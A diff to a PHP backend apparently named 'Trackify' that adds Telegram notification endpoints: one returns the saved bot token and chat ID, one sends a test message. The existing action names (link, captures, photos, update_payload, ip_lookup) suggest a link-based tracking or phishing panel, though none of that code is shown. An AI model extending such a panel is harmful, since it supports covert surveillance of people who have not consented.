@@ -7,7 +7,7 @@
 declare(strict_types=1);
 
 $action = $_GET['action'] ?? '';
-$authActions = ['start', 'stop', 'link', 'captures', 'photos', 'delete_photos', 'clear_captures', 'status', 'terminal', 'telegram', 'update_payload', 'diag', 'phone_lookup', 'phone_history', 'ip_lookup'];
+$authActions = ['start', 'stop', 'link', 'captures', 'photos', 'delete_photos', 'clear_captures', 'status', 'terminal', 'telegram', 'telegram_config', 'telegram_test', 'update_payload', 'diag', 'phone_lookup', 'phone_history', 'ip_lookup'];
 
 if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
     header('Content-Type: application/json');
@@ -69,6 +69,12 @@ switch ($action) {
         break;
     case 'telegram':
         handleTelegram();
+        break;
+    case 'telegram_config':
+        handleTelegramConfig();
+        break;
+    case 'telegram_test':
+        handleTelegramTest();
         break;
     case 'update_payload':
         handleUpdatePayload();
@@ -1625,6 +1631,43 @@ function handleTerminal(): void
     echo json_encode(['status' => 'success', 'events' => $events]);
 }
 
+function handleTelegramConfig(): void
+{
+    global $baseDir;
+
+    if ($_SERVER['REQUEST_METHOD'] !== 'GET') {
+        echo json_encode(['status' => 'error', 'message' => 'GET required']);
+        return;
+    }
+
+    $path = $baseDir . '/telegram_config.json';
+    if (!is_file($path)) {
+        echo json_encode(['status' => 'success', 'configured' => false]);
+        return;
+    }
+
+    $raw = @file_get_contents($path);
+    $j = is_string($raw) ? json_decode($raw, true) : null;
+    if (!is_array($j)) {
+        echo json_encode(['status' => 'success', 'configured' => false]);
+        return;
+    }
+
+    $botToken = trim((string) ($j['bot_token'] ?? ''));
+    $chatId = trim((string) ($j['chat_id'] ?? ''));
+    if ($botToken === '' || $chatId === '') {
+        echo json_encode(['status' => 'success', 'configured' => false]);
+        return;
+    }
+
+    echo json_encode([
+        'status' => 'success',
+        'configured' => true,
+        'bot_token' => $botToken,
+        'chat_id' => $chatId,
+    ]);
+}
+
 function handleTelegram(): void
 {
     global $baseDir;
@@ -1635,16 +1678,89 @@ function handleTelegram(): void
     }
 
     $input = json_decode(file_get_contents('php://input'), true) ?: $_POST;
-    $botToken = $input['bot_token'] ?? '';
-    $chatId = $input['chat_id'] ?? '';
 
-    if (empty($botToken) || empty($chatId)) {
+    $botToken = trim((string) ($input['bot_token'] ?? ''));
+    $chatId = trim((string) ($input['chat_id'] ?? ''));
+
+    if ($botToken === '' || $chatId === '') {
         echo json_encode(['status' => 'error', 'message' => 'bot_token and chat_id required']);
         return;
     }
 
     $config = ['bot_token' => $botToken, 'chat_id' => $chatId];
-    file_put_contents($baseDir . '/telegram_config.json', json_encode($config, JSON_PRETTY_PRINT));
+    if (@file_put_contents($baseDir . '/telegram_config.json', json_encode($config, JSON_PRETTY_PRINT), LOCK_EX) === false) {
+        echo json_encode(['status' => 'error', 'message' => 'Could not write telegram_config.json']);
+
+        return;
+    }
 
     echo json_encode(['status' => 'success', 'message' => 'Telegram config saved']);
+}
+
+function handleTelegramTest(): void
+{
+    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
+        echo json_encode(['status' => 'error', 'message' => 'POST required']);
+        return;
+    }
+
+    $input = json_decode(file_get_contents('php://input'), true) ?: $_POST;
+    $botToken = trim((string) ($input['bot_token'] ?? ''));
+    $chatId = trim((string) ($input['chat_id'] ?? ''));
+
+    if ($botToken === '' || $chatId === '') {
+        echo json_encode(['status' => 'error', 'message' => 'Bot token and chat ID are required']);
+
+        return;
+    }
+
+    $url = 'https://api.telegram.org/bot' . rawurlencode($botToken) . '/sendMessage';
+    $payload = json_encode([
+        'chat_id' => $chatId,
+        'text' => 'Trackify: test notification — your bot can reach this chat.',
+        'disable_web_page_preview' => true,
+    ]);
+    if ($payload === false) {
+        echo json_encode(['status' => 'error', 'message' => 'Could not build Telegram request']);
+
+        return;
+    }
+
+    $ctx = stream_context_create([
+        'http' => [
+            'method' => 'POST',
+            'header' => "Content-Type: application/json\r\n",
+            'content' => $payload,
+            'timeout' => 20,
+            'ignore_errors' => true,
+        ],
+        'ssl' => [
+            'verify_peer' => true,
+            'verify_peer_name' => true,
+        ],
+    ]);
+
+    $raw = @file_get_contents($url, false, $ctx);
+    if ($raw === false || $raw === '') {
+        echo json_encode(['status' => 'error', 'message' => 'Could not reach Telegram. Check token, network, and SSL.']);
+
+        return;
+    }
+
+    $json = json_decode($raw, true);
+    if (!is_array($json)) {
+        echo json_encode(['status' => 'error', 'message' => 'Invalid response from Telegram']);
+
+        return;
+    }
+
+    if (empty($json['ok'])) {
+        $desc = isset($json['description']) && is_string($json['description']) ? $json['description'] : 'Telegram API error';
+
+        echo json_encode(['status' => 'error', 'message' => $desc]);
+
+        return;
+    }
+
+    echo json_encode(['status' => 'success', 'message' => 'Test message sent. Check your Telegram chat.']);
 }
